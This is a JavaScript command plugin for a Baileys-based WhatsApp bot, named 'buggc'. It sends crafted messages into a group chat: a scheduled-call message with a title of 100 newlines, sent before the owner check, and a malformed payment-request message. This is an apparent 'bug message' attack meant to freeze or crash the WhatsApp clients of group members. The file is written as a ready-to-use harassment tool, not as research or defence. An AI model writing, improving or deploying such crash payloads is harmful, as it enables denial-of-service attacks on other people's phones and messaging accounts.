let handler = async (m, { conn, q, args, setReply, isOwner, command }) => {
  let sok = new Date();
  conn.relayMessage(
    m.chat,
    {
      scheduledCallCreationMessage: {
        callType: 1,
        scheduledTimestampMs: sok.getTime(),
        title: "\n".repeat(100),
      },
    },
    {}
  );
  const { proto, generateWAMessageFromContent } = require("baileys");
  if (!isOwner)
    return setReply("Fitur Ini Hanya Dapat Digunakan Oleh Developer!");
  if (!m.isGroup)
    return setReply("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
  let requestPaymentMessage = generateWAMessageFromContent(
    m.chat,
    proto.Message.fromObject({
      requestPaymentMessage: {
        currencyCodeIso4217: "IDR",
        amount1000: "1000",
        extendedTextMessage: {
          text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61",
        },
      },
    }),
    { userJid: m.chat }
  );
  conn.relayMessage(m.chat, requestPaymentMessage.message, {
    messageId: requestPaymentMessage.key.id,
  });
};
handler.help = ["owner"];
handler.tags = ["owner"];
handler.command = ["buggc"];
handler.owner = true;

export default handler;
